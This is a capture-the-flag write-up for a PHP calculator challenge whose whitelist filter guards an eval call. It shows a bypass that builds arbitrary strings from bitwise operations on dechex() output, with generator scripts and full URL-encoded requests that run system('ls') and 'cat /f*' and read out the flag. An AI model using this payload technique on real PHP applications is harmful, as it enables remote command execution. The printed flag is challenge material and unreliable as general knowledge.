# Calc.exe Online
**Category: Web** 

This challenge presents a calculator application where user provided expressions get evaluated:

![site](images/site.png)

## Exploring the Application

Looking at the page source, there is an anchor element that doesn't render on the page:
```html
<a href="/?source"></a>
```

The full source can be seen [here](source.html).

The important parts to calculate the expression are below:

```html
<div class="card-content">
    = <?= @safe_eval($_GET['expression']) ?>
</div>
```

```php
function safe_eval($code)
{
    if (strlen($code) > 1024) return "Expression too long.";
    $code = strtolower($code);
    $bad = is_safe($code);
    $res = '';
    if (strlen(str_replace(' ', '', $bad)))
        $res = "I don't like this: " . $bad;
    else
        eval('$res=' . $code . ";");
    return $res;
}
```
If our input passes some sanity checks and the `is_safe` check, it gets run through an `eval` function, and then rendered on the page. Since `eval` will run php commands, we will want to find a way of getting some system commands to run here.

```php
function is_safe($query)
{
    $query = strtolower($query);
    preg_match_all("/([a-z_]+)/", $query, $words);
    $words = $words[0];
    $good = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh', 'ncr', 'npr', 'number_format'];
    $accept_chars = '_abcdefghijklmnopqrstuvwxyz0123456789.!^&|+-*/%()[],';
    $accept_chars = str_split($accept_chars);
    $bad = '';
    for ($i = 0; $i < count($words); $i++) {
        if (strlen($words[$i]) && array_search($words[$i], $good) === false) {
            $bad .= $words[$i] . " ";
        }
    }

    for ($i = 0; $i < strlen($query); $i++) {
        if (array_search($query[$i], $accept_chars) === false) {
            $bad .= $query[$i] . " ";
        }
    }
    return $bad;
}
```
This function ensures that our input is only made up using a whitelist of math functions. Also that the input only uses approved characters. We need a way of running system commands that can be hidden within this whitelist.

## Designing an Exploit
I looked at the whitelist of functions and noticed that some of them return strings. For example: `dechex(10) = 'a'`. The approved character list grants us several bitwise operators that can be used (in addition to their math purpose) to transform strings into other strings. For example: `dechex(10)|dechex(3) = "s"`. The outputs from these functions can be concatenated with the "`.`" operator.

I wrote a program to generate arbitrary characters using this idea:

```php
<?php
$max = 15;
$result = array();
for ($i = 0; $i < $max; $i++) {
    for ($j = 0; $j < $max; $j++) {
        for ($k = 0; $k < $max; $k++) {
            $char = dechex($i) | dechex($j) | dechex($k);
            if (array_key_exists($char, $result) || preg_match('/[^\x20-\x7e]/', $char)) {
                continue;
            }
            echo '"' . $char . '": ' . '"(dechex('.$i.')|dechex('.$j.')|dechex('.$k.'))",' . PHP_EOL;
            $result[$char] = 1;
        }
    }
}
?>
```

```sh
$ php characters.php
"0": "(dechex(0)|dechex(0)|dechex(0))",
"1": "(dechex(0)|dechex(0)|dechex(1))",
"2": "(dechex(0)|dechex(0)|dechex(2))",
"3": "(dechex(0)|dechex(0)|dechex(3))",
"4": "(dechex(0)|dechex(0)|dechex(4))",
"5": "(dechex(0)|dechex(0)|dechex(5))",
"6": "(dechex(0)|dechex(0)|dechex(6))",
"7": "(dechex(0)|dechex(0)|dechex(7))",
"8": "(dechex(0)|dechex(0)|dechex(8))",
"9": "(dechex(0)|dechex(0)|dechex(9))",
"q": "(dechex(0)|dechex(0)|dechex(10))",
"r": "(dechex(0)|dechex(0)|dechex(11))",
"s": "(dechex(0)|dechex(0)|dechex(12))",
"t": "(dechex(0)|dechex(0)|dechex(13))",
"u": "(dechex(0)|dechex(0)|dechex(14))",
":": "(dechex(0)|dechex(2)|dechex(8))",
";": "(dechex(0)|dechex(2)|dechex(9))",
"v": "(dechex(0)|dechex(2)|dechex(13))",
"w": "(dechex(0)|dechex(2)|dechex(14))",
"<": "(dechex(0)|dechex(4)|dechex(8))",
"=": "(dechex(0)|dechex(4)|dechex(9))",
">": "(dechex(0)|dechex(6)|dechex(8))",
"?": "(dechex(0)|dechex(6)|dechex(9))",
"y": "(dechex(0)|dechex(8)|dechex(10))",
"z": "(dechex(0)|dechex(8)|dechex(11))",
"{": "(dechex(0)|dechex(8)|dechex(12))",
"|": "(dechex(0)|dechex(8)|dechex(13))",
"}": "(dechex(0)|dechex(8)|dechex(14))",
"~": "(dechex(2)|dechex(8)|dechex(13))",
"a": "(dechex(10)|dechex(10)|dechex(10))",
"c": "(dechex(10)|dechex(10)|dechex(11))",
"e": "(dechex(10)|dechex(10)|dechex(13))",
"g": "(dechex(10)|dechex(11)|dechex(13))",
"b": "(dechex(11)|dechex(11)|dechex(11))",
"f": "(dechex(11)|dechex(11)|dechex(13))",
"d": "(dechex(13)|dechex(13)|dechex(13))",
```

By updating the program to use all the different bitwise operators, I could generate a JSON file that I could reference later to create any payloads that I specify.

I wrote a program to read this file and create any payload I needed, hidden within math functions:

```python
#!/usr/bin/env python3

import json
import sys
import urllib.parse

if len(sys.argv) - 1 < 1:
    print('A command must be specified')
    exit(1)

payload = ''

with open('./chars.json') as chars_file:
    chars = json.load(chars_file)
    
    for index, char in enumerate(sys.argv[1]):
        if index != 0:
            payload += '.'
          
        payload += chars[char]
        payload += ''

    print(f"Payload:\n({payload})")
    print(f"URL Encoded:\n({urllib.parse.quote(payload)})")

```

The first thing I wanted to run was `system(ls)`. 

```sh
$ ./payload_generator.py 'system'
Payload:
((dechex(0)&dechex(0)|dechex(0)^dechex(12)).(dechex(0)&dechex(0)|dechex(8)^dechex(10)).(dechex(0)&dechex(0)|dechex(0)^dechex(12)).(dechex(0)&dechex(0)|dechex(0)^dechex(13)).(dechex(10)&dechex(10)|dechex(0)^dechex(4)).(dechex(10)&dechex(10)|dechex(4)^dechex(8)))
URL Encoded:
(%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2812%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%288%29%5Edechex%2810%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2812%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2813%29%29.%28dechex%2810%29%26dechex%2810%29%7Cdechex%280%29%5Edechex%284%29%29.%28dechex%2810%29%26dechex%2810%29%7Cdechex%284%29%5Edechex%288%29%29)

$ ./payload_generator.py 'ls'    
Payload:
((dechex(10)&dechex(11)|dechex(4)^dechex(8)).(dechex(0)&dechex(0)|dechex(0)^dechex(12)))
URL Encoded:
(%28dechex%2810%29%26dechex%2811%29%7Cdechex%284%29%5Edechex%288%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2812%29%29)
```

Putting the two outputs together, I can make this GET request to list the files:

```
GET /?expression=(%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2812%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%288%29%5Edechex%2810%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2812%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2813%29%29.%28dechex%2810%29%26dechex%2810%29%7Cdechex%280%29%5Edechex%284%29%29.%28dechex%2810%29%26dechex%2810%29%7Cdechex%284%29%5Edechex%288%29%29)(%28dechex%2810%29%26dechex%2811%29%7Cdechex%284%29%5Edechex%288%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2812%29%29)
```
```html
<div class="card-content">
= index.php
index.php                    
</div>
```

No flag file. The flag may be in `/` instead.

```sh
./payload_generator.py 'ls /'
Payload:
((dechex(10)&dechex(11)|dechex(4)^dechex(8)).(dechex(0)&dechex(0)|dechex(0)^dechex(12)).(dechex(0)&dechex(10)|dechex(0)^dechex(0)).(dechex(0)&dechex(10)|dechex(6)^dechex(9)))
URL Encoded:
(%28dechex%2810%29%26dechex%2811%29%7Cdechex%284%29%5Edechex%288%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2812%29%29.%28dechex%280%29%26dechex%2810%29%7Cdechex%280%29%5Edechex%280%29%29.%28dechex%280%29%26dechex%2810%29%7Cdechex%286%29%5Edechex%289%29%29)
```

I can replace the part of the GET request that corresponded with the original `ls` argument with this new output to `ls /`:

```
GET /?expression=(%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2812%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%288%29%5Edechex%2810%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2812%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2813%29%29.%28dechex%2810%29%26dechex%2810%29%7Cdechex%280%29%5Edechex%284%29%29.%28dechex%2810%29%26dechex%2810%29%7Cdechex%284%29%5Edechex%288%29%29)(%28dechex%2810%29%26dechex%2811%29%7Cdechex%284%29%5Edechex%288%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2812%29%29.%28dechex%280%29%26dechex%2810%29%7Cdechex%280%29%5Edechex%280%29%29.%28dechex%280%29%26dechex%2810%29%7Cdechex%286%29%5Edechex%289%29%29)
```
```html
<div class="card-content">
= bin
boot
dev
etc
flag_a2647e5eb8e9e767fe298aa012a49b50
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
var                    
</div>
```

And finally, we can read the flag by generating a payload to run `cat /f*`.

```sh
$ ./payload_generator.py 'cat /f*'
Payload:
((dechex(10)&dechex(10)|dechex(0)^dechex(2)).(dechex(10)&dechex(10)|dechex(0)^dechex(0)).(dechex(0)&dechex(0)|dechex(0)^dechex(13)).(dechex(0)&dechex(10)|dechex(0)^dechex(0)).(dechex(0)&dechex(10)|dechex(6)^dechex(9)).(dechex(10)&dechex(11)|dechex(0)^dechex(6)).(dechex(0)&dechex(10)|dechex(2)^dechex(8)))
URL Encoded:
(%28dechex%2810%29%26dechex%2810%29%7Cdechex%280%29%5Edechex%282%29%29.%28dechex%2810%29%26dechex%2810%29%7Cdechex%280%29%5Edechex%280%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2813%29%29.%28dechex%280%29%26dechex%2810%29%7Cdechex%280%29%5Edechex%280%29%29.%28dechex%280%29%26dechex%2810%29%7Cdechex%286%29%5Edechex%289%29%29.%28dechex%2810%29%26dechex%2811%29%7Cdechex%280%29%5Edechex%286%29%29.%28dechex%280%29%26dechex%2810%29%7Cdechex%282%29%5Edechex%288%29%29)
```

```
GET /?expression=(%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2812%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%288%29%5Edechex%2810%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2812%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2813%29%29.%28dechex%2810%29%26dechex%2810%29%7Cdechex%280%29%5Edechex%284%29%29.%28dechex%2810%29%26dechex%2810%29%7Cdechex%284%29%5Edechex%288%29%29)(%28dechex%2810%29%26dechex%2810%29%7Cdechex%280%29%5Edechex%282%29%29.%28dechex%2810%29%26dechex%2810%29%7Cdechex%280%29%5Edechex%280%29%29.%28dechex%280%29%26dechex%280%29%7Cdechex%280%29%5Edechex%2813%29%29.%28dechex%280%29%26dechex%2810%29%7Cdechex%280%29%5Edechex%280%29%29.%28dechex%280%29%26dechex%2810%29%7Cdechex%286%29%5Edechex%289%29%29.%28dechex%2810%29%26dechex%2811%29%7Cdechex%280%29%5Edechex%286%29%29.%28dechex%280%29%26dechex%2810%29%7Cdechex%282%29%5Edechex%288%29%29)
```
```html
<div class="card-content">
= flag{d0_y0u_kn0w_th1s_15_a_rea1_w0rld_cha11enge}
flag{d0_y0u_kn0w_th1s_15_a_rea1_w0rld_cha11enge}
</div>
```
